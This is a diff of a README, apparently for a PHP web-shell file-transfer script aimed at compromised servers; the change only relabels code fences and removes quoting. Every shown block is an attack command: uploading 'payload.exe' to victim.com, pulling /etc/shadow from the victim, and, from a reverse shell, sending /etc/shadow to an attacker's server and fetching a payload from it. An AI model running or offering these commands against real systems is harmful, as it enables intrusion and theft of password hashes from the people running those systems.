@@ -60,14 +60,14 @@ Navigate to the script on the victim's server with your preferred web browser, o
 
 Upload a file to the victim's server web root directory from your PC:
 
-```bash
-curl -s -k -X 'POST' 'https://victim.com/files.php' -F 'file=@/root/payload.exe'
+```fundamental
+curl -s -k -X POST https://victim.com/files.php -F file=@/root/payload.exe
 ```
 
 Download a file from the victim's PC to your PC:
 
-```bash
-curl -s -k -X 'GET' 'https://victim.com/files.php?file=/etc/shadow' -o shadow
+```fundamental
+curl -s -k -X GET https://victim.com/files.php?file=/etc/shadow -o shadow
 ```
 
 If you use reverse shell and you have elevated your initial privileges, this script might not have the same privileges as your shell. To download a certain file, you might need to copy the file to the web root directory and give it necessary read permissions.
@@ -78,16 +78,16 @@ From your PHP reverse shell, run the following cURL commands.
 
 Upload a file from the victim's PC to your server web root directory:
 
-```bash
-curl -s -k -X 'POST' 'https://your-server.com/files.php' -F 'file=@/etc/shadow'
+```fundamental
+curl -s -k -X POST https://your-server.com/files.php -F file=@/etc/shadow
 ```
 
 Download a file from your PC to the victim's PC:
 
-```bash
-curl -s -k -X 'GET' 'https://your-server.com/files.php?file=/root/payload.exe' -o payload.exe
+```fundamental
+curl -s -k -X GET https://your-server.com/files.php?file=/root/payload.exe -o payload.exe
 
-curl -s -k -X 'GET' 'https://your-server.com/payload.exe' -o payload.exe
+curl -s -k -X GET https://your-server.com/payload.exe -o payload.exe
 ```
 
 ## Minified Scripts
